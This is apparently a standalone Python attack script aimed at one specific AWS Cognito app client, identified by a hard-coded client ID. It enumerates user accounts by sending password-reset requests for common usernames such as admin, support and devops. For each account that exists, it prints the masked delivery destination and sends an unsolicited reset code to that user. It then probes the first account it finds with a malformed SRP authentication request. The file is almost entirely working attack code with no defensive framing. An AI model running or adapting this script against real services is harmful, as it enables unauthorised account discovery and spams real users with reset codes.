#!/usr/bin/env python3
import requests, sys, json, time

COGNITO = "https://cognito-idp.eu-west-1.amazonaws.com/"
CID = "4vituhli2m4ab10k69eeqc1839"

def enum(username):
    r = requests.post(COGNITO, headers={"X-Amz-Target":"AWSCognitoIdentityProviderService.ForgotPassword","Content-Type":"application/x-amz-json-1.1"}, json={"ClientId":CID,"Username":username}, timeout=10)
    d = r.json()
    if "CodeDeliveryDetails" in d:
        return {"exists":True,"dest":d["CodeDeliveryDetails"].get("Destination","?"),"user":username}
    return {"exists":False,"user":username}

def srp(username):
    r = requests.post(COGNITO, headers={"X-Amz-Target":"AWSCognitoIdentityProviderService.InitiateAuth","Content-Type":"application/x-amz-json-1.1"}, json={"AuthFlow":"USER_SRP_AUTH","ClientId":CID,"AuthParameters":{"USERNAME":username,"SRP_A":"00"}}, timeout=10)
    d = r.json()
    return {"challenge":d.get("ChallengeName","none"),"user":username}

if __name__=="__main__":
    users = sys.argv[1:] if len(sys.argv)>1 else ["admin","support","info","security","devops","developer","test","engineering"]
    found = []
    for u in users:
        r = enum(u)
        if r.get("exists"):
            print(f"[+] {u} -> EXISTS ({r['dest']})")
            found.append(r)
        else:
            print(f"[-] {u} -> NOT FOUND")
        time.sleep(0.3)
    if found:
        s = srp(found[0]["user"])
        print(f"SRP Challenge: {s}")
    print(json.dumps(found, indent=2))
